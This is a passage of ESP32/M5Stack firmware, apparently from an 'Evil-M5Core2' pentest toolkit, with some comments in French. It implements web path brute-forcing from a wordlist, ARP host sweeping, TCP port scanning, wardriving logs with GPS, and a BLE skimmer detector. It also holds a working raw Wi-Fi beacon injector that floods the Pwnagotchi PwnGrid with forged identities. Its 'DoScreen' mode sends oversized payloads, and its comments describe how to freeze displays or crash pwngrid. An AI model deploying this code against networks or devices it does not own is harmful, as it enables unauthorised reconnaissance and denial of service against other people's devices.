  } else if (!urlBase.startsWith("http://") && !urlBase.startsWith("https://")) {
    urlBase = "http://" + urlBase;
  }

  WiFiClient client;
  WiFiClientSecure secureClient;
  HTTPClient http;
  bool urlAccessible = false;

  setupHttpClient(http, client, secureClient, urlBase);
  if (handleHttpResponse(http, urlBase)) {
    urlAccessible = true;
  } else if (urlBase.startsWith("http://") && confirmPopup("HTTP not accessible. Try HTTPS?")) {
    M5.Display.setTextSize(1);
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Setup Https...");
    urlBase.replace("http://", "https://");
    setupHttpClient(http, client, secureClient, urlBase);
    if (handleHttpResponse(http, urlBase)) {
      urlAccessible = true;
    }
  }

  if (!urlAccessible) {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("URL not accessible.");
    delay(3000);  // Afficher le message pendant 3 secondes
    waitAndReturnToMenu("Returning to menu...");
    return;  // Return to the menu
  }

  displayUrls();

  File file = SD.open("/crawler_wordlist.txt");
  if (!file) {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Failed to open file for reading");
    delay(2000);  // Afficher le message pendant 2 secondes
    return;
  }

  Serial.println("-------- Starting crawling on :" + urlBase);
  while (file.available()) {
    M5.update();
    
    String path = file.readStringUntil('\n');
    path.trim();
    if (path.length() > 0) {
      String fullUrl = urlBase;
      if (!urlBase.endsWith("/")) {
        fullUrl += "/";
      }
      fullUrl += path;
      Serial.println("Testing path: " + fullUrl);
      M5.Display.setCursor(0, M5.Display.height() - 10);
      M5.Display.println("On: /" + path + "                                                             ");
      setupHttpClient(http, client, secureClient, fullUrl);
      if (http.GET() == 200) {
        addUrl(path);  // Ajouter l'URL à la liste et mettre à jour l'affichage
        Serial.println("------------------------------------ Path that respond 200 : /" + fullUrl);
      }
    }
    if (M5.BtnB.isPressed()) {
      M5.Display.setCursor(0, M5.Display.height() - 10);
      M5.Display.println("Crawling Stopped!");
      enterDebounce();
      break;  // Quitter la boucle
    }
  }

  file.close();
  M5.Display.setCursor(0, M5.Display.height() - 10);
  M5.Display.println("Finished Crawling!");

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      scrollUp();
    } else if (M5.BtnC.wasPressed()) {
      scrollDown();
    } else if (M5.BtnB.wasPressed()) {
      urlBase = "";
      M5.Display.setTextSize(1.5);
      waitAndReturnToMenu("Returning to menu...");
      break;  // Quitter la boucle
    }
    delay(100);
  }
  http.end();
  waitAndReturnToMenu("Returning to menu...");
  M5.Display.setTextSize(1.5);
}




// Scan des hôtes

// Déclarations des fonctions ARP
void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist);
void send_arp(char * from_ip, std::vector<IPAddress>& hostslist);

// Fonction pour enregistrer les résultats ARP
void logARPResult(IPAddress host, bool responded) {
  char buffer[64];
  if (responded) {
    sprintf(buffer, "Host %s respond to ARP.", host.toString().c_str());
  } else {
    sprintf(buffer, "Host %s did not respond to ARP.", host.toString().c_str());
  }
  Serial.println(buffer);
}

// Fonction pour effectuer une requête ARP
bool arpRequest(IPAddress host) {
  char ipStr[16];
  sprintf(ipStr, "%s", host.toString().c_str());
  ip4_addr_t test_ip;
  ipaddr_aton(ipStr, (ip_addr_t*)&test_ip);

  struct eth_addr *eth_ret = NULL;
  const ip4_addr_t *ipaddr_ret = NULL;
  bool responded = etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0;
  logARPResult(host, responded);
  return responded;
}


void scanHosts() {
  local_scan_setup();
  waitAndReturnToMenu("Return to menu");
}

void local_scan_setup() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  enterDebounce();
  IPAddress gatewayIP;
  IPAddress subnetMask;
  std::vector<IPAddress> hostslist;
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setTextSize(1.5);

  gatewayIP = WiFi.gatewayIP();
  subnetMask = WiFi.subnetMask();

  IPAddress network = WiFi.localIP();
  network[3] = 0;
  M5.Display.clear();
  int numHosts = 254 - subnetMask[3];
  M5.Display.setCursor(0, M5.Display.height() / 2);
  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
  M5.Display.println("       please wait...");

  bool foundHosts = false;
  bool stopScan = false; // Variable pour vérifier si ENTER est pressé

  // Préparer l'adresse de base pour les requêtes ARP
  char base_ip[16];
  sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

  // Envoyer les requêtes ARP à tout le réseau
  send_arp(base_ip, hostslist);

  // Lire la table ARP pour détecter les hôtes actifs
  read_arp_table(base_ip, 1, numHosts, hostslist);

  // Parcourir la table ARP et afficher les résultats
  for (int i = 1; i <= numHosts; i++) {
    if (stopScan) {
      break; // Sortir de la boucle si ENTER est pressé
    }

    IPAddress currentIP = network;
    currentIP[3] = i;

    if (arpRequest(currentIP)) {
      hostslist.push_back(currentIP);
      foundHosts = true;
    }
  }

  if (!foundHosts) {
    M5.Display.println("No hosts found.");
    delay(2000); // Display message for 2 seconds
    return;
  }

  displayHostOptions(hostslist);
}

// Implementation des fonctions ARP
void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist) {
  Serial.printf("Reading ARP table from: %d to %d\n", read_from, read_to);
  for (int i = read_from; i <= read_to; i++) {
    char test[32];
    sprintf(test, "%s%d", from_ip, i);
    ip4_addr_t test_ip;
    ipaddr_aton(test, (ip_addr_t*)&test_ip);

    const ip4_addr_t *ipaddr_ret = NULL; // Modification ici
    struct eth_addr *eth_ret = NULL;
    if (etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0) {
      IPAddress foundIP;
      foundIP.fromString(ipaddr_ntoa((ip_addr_t*)&test_ip));
      hostslist.push_back(foundIP);
      Serial.printf("Adding found IP: %s\n", ipaddr_ntoa((ip_addr_t*)&test_ip));
    }
  }
}

void send_arp(char * from_ip, std::vector<IPAddress>& hostslist) {
  Serial.println("Sending ARP requests to the whole network");
  const TickType_t xDelay = (10) / portTICK_PERIOD_MS; // Délai de 0.01 secondes
  void * netif = NULL;
  tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
  struct netif *netif_interface = (struct netif *)netif;

  for (char i = 1; i < 254; i++) {
    char test[32];
    sprintf(test, "%s%d", from_ip, i);
    ip4_addr_t test_ip;
    ipaddr_aton(test, (ip_addr_t*)&test_ip);

    // Envoyer la requête ARP
    int8_t arp_request_ret = etharp_request(netif_interface, &test_ip);
    vTaskDelay(xDelay); // Délai
  }
  // Lire toutes les entrées de la table ARP
  read_arp_table(from_ip, 1, 254, hostslist);
}


void displayHostOptions(const std::vector<IPAddress>& hostslist) {
  enterDebounce();
  std::vector<std::pair<std::string, std::function<void()>>> options;
  Serial.println("Hosts that responded to ARP:");
  for (IPAddress ip : hostslist) {
    String txt = ip.toString();
    options.push_back({ txt.c_str(), [ = ]() {
      afterScanOptions(ip, hostslist);
    }
                      });
    Serial.println(txt);
  }

  bool scanninghost = true;
  int index = 0;
  int lineHeight = 12; // Hauteur de ligne pour chaque option 

  while (!M5.BtnB.wasPressed()) {
    M5.update(); // Mise à jour du clavier
     // Mise à jour du clavier

    if (scanninghost) {
      // Clear screen
      M5.Display.clear();
      M5.Display.setCursor(0, 0);

      // Display options
      for (int i = 0; i < options.size(); ++i) {
        if (i == index) {
          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(0, i * lineHeight);
        M5.Display.println(options[i].first.c_str());
      }

      scanninghost = false;
    }

    // Check for user input
    if (M5.BtnA.wasPressed()) {
      index = (index > 0) ? index - 1 : options.size() - 1;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5.BtnC.wasPressed()) {
      index = (index < options.size() - 1) ? index + 1 : 0;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5.BtnB.wasPressed()) {
      Serial.print("Selected option: ");
      Serial.println(options[index].first.c_str());
      options[index].second(); // Execute the function associated with the option
      break; // Exit loop after executing the selected option
    }
    if (M5.BtnPWR.wasClicked()) {
      return; // Exit loop after executing the selected option
    }

    delay(100); // Small delay to avoid CPU overload
  }
}

//from https://github.com/pr3y/bruce and refactored
void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist) {
  enterDebounce();
  std::vector<std::pair<std::string, std::function<void()>>> option;
  option = {
    { "Scan Ports", [ = ]() {
        scanPorts(ip);
        displayHostOptions(hostslist); // Return to host options after port scan
      }
    },
    { "Web Crawling", [ = ]() {
        webCrawling(ip);
        displayHostOptions(hostslist); // Return to host options after web crawling
      }
    },
  };

  bool scanninghost = true;
  int index = 0;
  int lineHeight = 12; // Hauteur de ligne pour chaque option

  while (1) {
    M5.update(); // Mise à jour du clavier
     // Mise à jour du clavier

    if (scanninghost) {
      // Clear screen
      M5.Display.clear();
      M5.Display.setCursor(0, 0);

      // Display options
      for (int i = 0; i < option.size(); ++i) {
        if (i == index) {
          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(0, i * lineHeight);
        M5.Display.println(String(i + 1) + ". " + option[i].first.c_str());
      }

      scanninghost = false;
    }

    // Check for user input
    if (M5.BtnA.wasClicked()) {
      index = (index > 0) ? index - 1 : option.size() - 1;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5.BtnC.wasClicked()) {
      index = (index < option.size() - 1) ? index + 1 : 0;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5.BtnB.wasClicked()) {
      Serial.print("Selected option: ");
      Serial.println(option[index].first.c_str());
      option[index].second(); // Execute the function associated with the option
      break; // Exit loop after executing the selected option
    }
    if (M5.BtnPWR.wasClicked()) {
      displayHostOptions(hostslist); // Return to host options
      return;
    }

    delay(100);
  }
  delay(200);
}


//from https://github.com/pr3y/bruce and refactored
void scanPorts(IPAddress host) {
  enterDebounce();
  WiFiClient client;
  const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 445, 3306, 3389, 8080, 8443, 9090};
  const int numPorts = sizeof(ports) / sizeof(ports[0]);
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(1, 20);
  M5.Display.print("Host: " + host.toString());
  M5.Display.setCursor(1, 34);
  M5.Display.println("Ports Open: ");
  M5.Display.println("");
  for (int i = 0; i < numPorts; i++) {
    int port = ports[i];
    if (client.connect(host, port)) {
      M5.Display.print(port);
      M5.Display.print(", ");
      Serial.println("Port " + String(port) + " Open");
      client.stop();
    } else {
      M5.Display.print("*");
      M5.Display.print(", ");
    }
  }
  M5.Display.setCursor(1, M5.Display.getCursorY() + 16);
  M5.Display.print("Finished!");
  while (!M5.BtnB.isPressed()) {
    M5.update();
    delay(10); // Petit délai pour réduire la charge du processeur
  }
  enterDebounce();
}

//Scan hosts


// Global flag to control the spam task
volatile bool spamRunning = false;
volatile bool stop_beacon = false;
volatile bool dos_pwnd = false;
volatile bool change_identity = false;

// Global arrays to hold the faces and names
const char* faces[30];  // Increase size if needed
const char* names[30];  // Increase size if needed
int num_faces = 0;
int num_names = 0;

// Forward declarations
void displaySpamStatus();
void returnToMenu();
void loadFacesAndNames();

// Définir la trame beacon brute
const uint8_t beacon_frame_template[] = {
  0x80, 0x00,                          // Frame Control
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination Address (Broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Source Address (SA)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // BSSID
  0x00, 0x00,                          // Sequence/Fragment number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,  // Beacon interval
  0x11, 0x04   // Capability info
};

// Function to generate a random string that resembles a SHA-256 hash
String generate_random_identity() {
  const char hex_chars[] = "0123456789abcdef";
  String random_identity = "";
  for (int i = 0; i < 64; ++i) {
    random_identity += hex_chars[random(0, 16)];
  }
  return random_identity;
}

void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name) {
  DynamicJsonDocument json(2048);
  json["pal"] = true;
  json["name"] = name;
  json["face"] = face; // change to {} to freeze the screen
  json["epoch"] = 1;
  json["grid_version"] = "1.10.3";
  if (change_identity) {
    json["identity"] = generate_random_identity();
  } else {
    json["identity"] = "0451ba5054b258a24ba3adff2c5e3b637f28de36cb5e20d7cd960ec27b7c1164"; // change to {} to crash pwngrid
  }
  json["pwnd_run"] = 0;
  json["pwnd_tot"] = 0;
  json["session_id"] = "a2:00:64:e6:0b:8b";
  json["timestamp"] = 0;
  json["uptime"] = 0;
  json["version"] = "1.8.4";
  json["policy"]["advertise"] = true;
  json["policy"]["bond_encounters_factor"] = 20000;
  json["policy"]["bored_num_epochs"] = 0;
  json["policy"]["sad_num_epochs"] = 0;
  json["policy"]["excited_num_epochs"] = 9999;

  String json_str;
  serializeJson(json, json_str);

  uint16_t json_len = json_str.length();
  uint8_t header_len = 2 + ((json_len / 255) * 2);
  uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
  memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

  // Ajout des données JSON à la trame beacon
  int frame_byte = sizeof(beacon_frame_template);
  for (int i = 0; i < json_len; i++) {
    if (i == 0 || i % 255 == 0) {
      beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (json_len - i < 255) {
        payload_len = json_len - i;
      }
      beacon_frame[frame_byte++] = payload_len;
    }
    beacon_frame[frame_byte++] = (uint8_t)json_str[i];
  }

  // Définir le canal et envoyer la trame
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
}

const char* pwnd_faces[] = {
  "NOPWND!■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};
const char* pwnd_names[] = {
  "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};

// Tâche pour envoyer des trames beacon avec changement de face, de nom et de canal
void beacon_task(void* pvParameters) {
  const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi à utiliser
  const int num_channels = sizeof(channels) / sizeof(channels[0]);
  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);

  while (spamRunning) {
    if (dos_pwnd) {
      // Send PWND beacons
      for (int ch = 0; ch < num_channels; ++ch) {
        if (stop_beacon) {
          break;
        }
        send_pwnagotchi_beacon(channels[ch], pwnd_faces[0], pwnd_names[0]);
        vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
      }
    } else {
      // Send regular beacons
      for (int i = 0; i < num_faces; ++i) {
        for (int ch = 0; ch < num_channels; ++ch) {
          if (stop_beacon) {
            break;
          }
          send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
          vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
        }
      }
    }
  }

  vTaskDelete(NULL);
}

void displaySpamStatus() {
  enterDebounce();
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE , TFT_BLACK);
  M5.Display.setCursor(0, 10);
  M5.Display.println("PwnGrid Spam Running...");
  M5.Display.setCursor(M5.Display.width() / 2 - 16 , M5.Display.height() - 16);
  M5.Display.println("Stop");

  int current_face_index = 0;
  int current_name_index = 0;
  int current_channel_index = 0;
  const uint8_t channels[] = {1, 6, 11};
  const int num_channels = sizeof(channels) / sizeof(channels[0]);

  while (spamRunning) {
    M5.update();

    if (M5.BtnB.wasPressed()) {
      spamRunning = false;
      waitAndReturnToMenu("Back to menu");
      break;
    }
    if (M5.BtnC.wasPressed()) {
      dos_pwnd = !dos_pwnd;
      Serial.printf("DoScreen %s.\n", dos_pwnd ? "enabled" : "disabled");
    }
    if (M5.BtnA.wasPressed()) {
      change_identity = !change_identity;
      Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
    }

    // Update and display current face, name, and channel
    M5.Display.setCursor(30, 45);
    M5.Display.printf("Flood:%s", change_identity ? "1" : "0");
    M5.Display.setCursor(150, 45);
    M5.Display.printf("DoScreen:%s", dos_pwnd ? "1" : "0");
    if (!dos_pwnd) {
      M5.Display.setCursor(0, 75);
      M5.Display.printf("Face: \n%s                                              ", faces[current_face_index]);
      M5.Display.setCursor(0, 120);
      M5.Display.printf("Name:                  \n%s                                              ", names[current_name_index]);
    } else {
      M5.Display.setCursor(0, 75);
      M5.Display.printf("Face:\nNOPWND!■■■■■■■■■■■■■■■■■");
      M5.Display.setCursor(0, 120);
      M5.Display.printf("Name:\n■■■■■■■■■■■■■■■■■■■■■■■■");
    }
    M5.Display.setCursor(0, 165);
    M5.Display.printf("Channel: %d  ", channels[current_channel_index]);

    // Update indices for next display
    current_face_index = (current_face_index + 1) % num_faces;
    current_name_index = (current_name_index + 1) % num_names;
    current_channel_index = (current_channel_index + 1) % num_channels;

    delay(200); // Update the display every 200 ms
  }
}


void loadFacesAndNames() {
  File file = SD.open("/config/pwngridspam.txt");
  if (!file) {
    Serial.println("Failed to open file for reading");
    return;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("faces=")) {
      String faces_line = line.substring(6);
      faces_line.replace("\"", "");  // Remove quotes
      faces_line.trim();  // Remove leading/trailing whitespace
      faces_line.replace("\\n", "\n");  // Handle newline characters
      int start = 0;
      int end = faces_line.indexOf(',', start);
      num_faces = 0;
      while (end != -1) {
        faces[num_faces++] = strdup(faces_line.substring(start, end).c_str());
        start = end + 1;
        end = faces_line.indexOf(',', start);
      }
      faces[num_faces++] = strdup(faces_line.substring(start).c_str());
    } else if (line.startsWith("names=")) {
      String names_line = line.substring(6);
      names_line.replace("\"", "");  // Remove quotes
      names_line.trim();  // Remove leading/trailing whitespace
      int start = 0;
      int end = names_line.indexOf(',', start);
      num_names = 0;
      while (end != -1) {
        names[num_names++] = strdup(names_line.substring(start, end).c_str());
        start = end + 1;
        end = names_line.indexOf(',', start);
      }
      names[num_names++] = strdup(names_line.substring(start).c_str());
    }
  }
  file.close();
}

extern "C" void send_pwnagotchi_beacon_main() {
  // Initialiser NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialiser la configuration Wi-Fi
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());

  // Load faces and names from the file
  loadFacesAndNames();

  // Set the spamRunning flag to true
  spamRunning = true;

  // Créer la tâche beacon
  xTaskCreate(&beacon_task, "beacon_task", 4096, NULL, 5, NULL);

  // Display the spam status and wait for user input
  displaySpamStatus();
}




















// detectskimmer

BLEScan* pBLEScan;
bool isScanning = false;
bool skimmerDetected = false;
bool isBLEScanning = false;
String skimmerInfo;

const char* badDeviceNames[] = {"HC-03", "HC-05", "HC-06", "HC-08", "BT04-A", "BT05"};
const int badDeviceNamesCount = sizeof(badDeviceNames) / sizeof(badDeviceNames[0]);

const char* badMacPrefixes[] = {"00:11:22", "00:18:E4", "20:16:04"};
const int badMacPrefixesCount = sizeof(badMacPrefixes) / sizeof(badMacPrefixes[0]);

unsigned long lastUpdate = 0;
const unsigned long refreshInterval = 500;

class SkimmerAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  public:
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      bool isSkimmerDetected = false;
      String displayMessage;

      std::string deviceAddress = advertisedDevice.getAddress().toString();
      std::string deviceName = advertisedDevice.getName();
      int rssi = advertisedDevice.getRSSI();

      for (int i = 0; i < badDeviceNamesCount; i++) {
        if (deviceName == badDeviceNames[i]) {
          isSkimmerDetected = true;
          break;
        }
      }

      for (int i = 0; i < badMacPrefixesCount && !isSkimmerDetected; i++) {
        if (deviceAddress.substr(0, 8) == badMacPrefixes[i]) {
          isSkimmerDetected = true;
          break;
        }
      }

      displayMessage = "_________________\n\n";
      displayMessage += "Device: \n";
      displayMessage += deviceName.length() != 0 ? deviceName.c_str() : deviceAddress.c_str();
      displayMessage += "\n\n";
      displayMessage += "RSSI: " + String(rssi) + "\n";
      displayMessage += "Skimmer: " + String(isSkimmerDetected ? "Probable" : "No");
      displayMessage += "\n_________________";

      Serial.println(displayMessage);

      unsigned long currentTime = millis();
      if (currentTime - lastUpdate >= refreshInterval) {
        lastUpdate = currentTime;
        M5.Display.fillScreen(TFT_BLACK);
        M5.Display.setTextSize(3);
        M5.Display.setCursor(0, 0);
        M5.Display.setTextColor(isSkimmerDetected ? TFT_RED : menuTextUnFocusedColor);
        M5.Display.println(displayMessage);
      }

      if (isSkimmerDetected && !skimmerDetected) {
        skimmerDetected = true;
        skimmerInfo = displayMessage;
      }
    }
};

void skimmerDetection() {
  WiFi.disconnect(true);
  delay(100);
  BLEDevice::deinit(true);
  if (!BLEDevice::getInitialized()) {
    BLEDevice::init("");
  }

  if (pBLEScan != nullptr) {
    if (isBLEScanning) {
      pBLEScan->stop();
      isBLEScanning = false;
    }
    pBLEScan->clearResults();
  }

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new SkimmerAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(1349);
  pBLEScan->setWindow(449);

  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setTextSize(3);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.setCursor(0, 0);
  M5.Display.println("Scanning for Skimmers...");

  isScanning = true;
  skimmerDetected = false;
  skimmerInfo = "";

  pBLEScan->start(0, nullptr, false);
  isBLEScanning = true;
  enterDebounce();
  while (isScanning) {
    M5.update();

    if (M5.BtnB.wasPressed()) {
      if (pBLEScan != nullptr && isBLEScanning) {
        pBLEScan->stop();
        isBLEScanning = false;
      }
      isScanning = false;
      waitAndReturnToMenu("Scan Stopped");
      return;
    }

    if (skimmerDetected) {
      if (pBLEScan != nullptr && isBLEScanning) {
        pBLEScan->stop();
        isBLEScanning = false;
      }
      isScanning = false;

      M5.Display.fillScreen(TFT_BLACK);
      M5.Display.setTextSize(3);
      M5.Display.setCursor(0, 0);
      M5.Display.setTextColor(TFT_RED);
      M5.Display.println(skimmerInfo);
      M5.Speaker.tone(1000, 500);
      while (true) {
        M5.update();
        if (M5.BtnB.wasPressed()) {
          waitAndReturnToMenu("Skimmer Detected - Caution");
          return;
        }
        delay(100);
      }
    }
    delay(100);
  }
}


// detectskimmer end




// Constants defined here:
#define LOG_FILE_PREFIX "/wardriving/wardriving-0"
#define MAX_LOG_FILES 100
#define LOG_FILE_SUFFIX "csv"
#define LOG_COLUMN_COUNT 11
#define LOG_RATE 500

File myFile;
char logFileName[13];
int totalNetworks = 0;
unsigned long lastLog = 0;
int currentScreen = 1;  // Track which screen is currently displayed

const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.9,model=M5Core2,release=v1.3.9,device=Evil-M5Core2,display=7h30th3r0n3,board=M5Core2,brand=M5Stack";

char* log_col_names[LOG_COLUMN_COUNT] = {
  "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
};

String recentSSID;
String recentSSID1;
String recentSSID2;
String boardSSIDs[14];
int boardSeen[14] = {0};

// Structure for ESP-NOW messages
typedef struct struct_message {
  char bssid[64];
  char ssid[32];
  char encryptionType[16];
  int32_t channel;
  int32_t rssi;
  int boardID;
} struct_message;

// Create a struct_message called myData
struct_message myData;

// ESP-NOW Data Receive Callback Function
void OnDataRecv(const uint8_t* mac, const uint8_t* incomingData, int len) {
  File logFile = SD.open(logFileName, FILE_APPEND);
  memcpy(&myData, incomingData, sizeof(myData));

  // Display received data on screen 2
  if (currentScreen == 2) {
    displayReceivedData();
  }

  // Log data
  logFile.print(myData.bssid);
  logFile.print(",");
  String SSIDString = myData.ssid;
  SSIDString.replace(",", ".");  // Replace commas for CSV format
  logFile.print(SSIDString);
  logFile.print(",");
  logFile.print(myData.encryptionType);
  logFile.print(",");
  logFile.print(gps.date.year());
  logFile.print("-");
  logFile.print(gps.date.month());
  logFile.print("-");
  logFile.print(gps.time.hour());
  logFile.print("-");
  logFile.print(gps.time.minute());
  logFile.print("-");
  logFile.print(gps.time.second());
  logFile.print(",");
  logFile.print(myData.channel);
  logFile.print(",");
  logFile.print(myData.rssi);
  logFile.print(",");
  logFile.print(gps.location.lat(), 8);
  logFile.print(",");
  logFile.print(gps.location.lng(), 8);
  logFile.print(",");
  logFile.print(gps.altitude.meters());
  logFile.print(",");
  logFile.print(gps.hdop.value());
  logFile.print(",");
  logFile.print("WIFI");
  logFile.println();
  logFile.close();

  recentSSID2 = recentSSID1;
  recentSSID1 = recentSSID;
  recentSSID = myData.ssid;

  if (myData.boardID >= 1 && myData.boardID <= 14) {
    boardSSIDs[myData.boardID - 1] = myData.ssid;
    boardSeen[myData.boardID - 1]++;
  }

  totalNetworks++;
}

void updateFileName() {
  for (int i = 0; i < MAX_LOG_FILES; i++) {
    sprintf(logFileName, "%s%d.%s", LOG_FILE_PREFIX, i, LOG_FILE_SUFFIX);
    if (!SD.exists(logFileName)) {
      Serial.println("New file name chosen:");
      Serial.println(logFileName);
      break;
    } else {
      Serial.print(logFileName);
      Serial.println(" exists");
    }
  }
}

void printHeader() {
  File logFile = SD.open(logFileName, FILE_WRITE);
  if (logFile) {
    logFile.println(wigleHeaderFileFormat);
    for (int i = 0; i < LOG_COLUMN_COUNT; i++) {
      logFile.print(log_col_names[i]);
      if (i < LOG_COLUMN_COUNT - 1) logFile.print(',');
      else logFile.println();
    }
    logFile.close();
  }
}

// General Information Screen
void displayGeneralInfo() {
  M5.Display.clear();
  int margin = 0;
  int lineHeight = 14;
  int col1Width = 40;
  int col2Width = 60;
  int col3Width = 80;
  int separatorWidth = 12;

  int x = margin;
  int y = margin;

  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(x, y);
  M5.Display.printf("Lat:%.3f|Lon:%.3f|Sat:%d|Tn:%d",
                    gps.location.lat(),
                    gps.location.lng(),
                    gps.satellites.value(),
                    totalNetworks);
  M5.Display.setTextSize(2);
  y += lineHeight;
  y += 4;
  M5.Display.drawLine(margin, y, 320 - margin, y, taskbarDividerColor);
  y += 8;

  for (int i = 0; i < 14; i++) {
    if (boardSeen[i] > 0) {
      M5.Display.setCursor(x, y);
      M5.Display.printf("%2d", i + 1);
      M5.Display.setCursor(x + col1Width + separatorWidth, y);
      M5.Display.printf("%2d", boardSeen[i]);
      M5.Display.setCursor(x + col1Width + col2Width + 2 * separatorWidth, y);
      M5.Display.printf("%-8s", boardSSIDs[i].c_str());
      y += lineHeight;
      y += 2;
      M5.Display.drawLine(margin, y, 320 - margin, y, taskbarDividerColor);
      y += 4;
      if (y > 240 - margin) break;
    }
  }

  y += 10;
  M5.Display.setCursor(x, y);
  M5.Display.print("Recent SSIDs:");
  String combinedSSIDs = recentSSID + ", " + recentSSID1 + ", " + recentSSID2;
  y += lineHeight;
  y += 2;
  M5.Display.setCursor(x, y);
  M5.Display.printf("%s", combinedSSIDs.c_str());
  M5.Display.display();
}

unsigned long lastDisplayTime = 0;  // Variable to track the last display time
unsigned long displayInterval = 1000;  // 1 second interval

// Data Received Screen
void displayReceivedData() {
  // Check if 1 second has passed since the last update
  if (millis() - lastDisplayTime >= displayInterval) {
    M5.Display.clear();
    int y = 2;  // Initial y position for the text
    int lineHeight = 14;  // Height of each line, you can adjust this if needed
    int spacing = 2;  // Additional spacing between lines

    M5.Display.setCursor(0, y);
    M5.Display.println("Last data received:");
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("MAC: ");
    M5.Display.println(myData.bssid);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("SSID: ");
    M5.Display.println(myData.ssid);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("Encryption: ");
    M5.Display.println(myData.encryptionType);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("Channel: ");
    M5.Display.println(myData.channel);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("RSSI: ");
    M5.Display.println(myData.rssi);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
